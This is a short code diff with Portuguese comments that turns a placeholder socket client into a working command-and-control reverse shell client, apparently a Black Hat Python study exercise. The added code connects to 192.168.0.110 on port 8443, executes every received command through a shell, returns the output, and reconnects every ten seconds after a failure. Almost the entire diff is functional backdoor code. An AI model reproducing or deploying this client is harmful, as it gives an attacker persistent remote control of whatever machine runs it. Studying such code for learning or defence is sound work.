@@ -1,10 +1,23 @@
 #Criaremos um cliente tipo C&C em que aceita conexões remotas de um servidor para que eu possa executar comandos remotos.
 
 import socket
+import subprocess
+import time
 
-def start_client():
-    #Cria o socket
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(("localhost", 8080))
+while True:
     
-    #https://www.kea.nu/files/textbooks/humblepy/blackhatpython.pdf
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(("192.168.0.110", 8443))
+        
+        while True:
+            cmd = client.recv(2048).decode()
+            
+            if cmd == "exit":
+                client.close()
+                break
+            
+            saida, erro = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
+            client.sendall(saida + erro)
+    except:
+        time.sleep(10)
